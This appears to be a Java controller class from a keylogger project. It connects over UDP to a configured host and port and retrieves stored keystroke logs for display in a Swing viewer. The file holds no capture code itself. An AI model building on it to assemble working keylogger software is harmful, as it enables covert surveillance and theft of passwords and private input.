package com.hao.keylogger.controllers;

import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Date;

import javax.swing.JFrame;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.views.ClientView;

public class ClientLogController {
	private ClientView logView;
	private Log log;
	
	UDPClientHelper udpHelper;

	public ClientLogController(ClientView logView, Log log) {
		super();
		this.logView = logView;
		this.log = log;
		this.logView.setController(this);
	}

	public JFrame getLogView() {
		return logView;
	}

	public void setLogView(ClientView logView) {
		this.logView = logView;
	}

	public Log getLog() {
		return log;
	}

	public void setLog(Log log) {
		this.log = log;
	}

	public void loadView() {
		logView.setHost(log.getHost());
		logView.setPort(log.getPort());
		logView.setLogContent(log.getContent());
	}

	public boolean connect() {
		String hostName = logView.getHost();
		int port = logView.getPort();
		try {
			udpHelper = UDPClientHelper.getInstance(hostName, port);
			udpHelper.connect();
			return true;
		} catch (SocketException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		return false;
	}
	
	public void fetchLog(Date date) throws NullPointerException {
		log = udpHelper.fetchLog(date);
		loadView();
	}
	
	public void fetchAllLogs() {
		ArrayList<Log> logs = udpHelper.fetchAllLogs();
		// load to view
	}

}
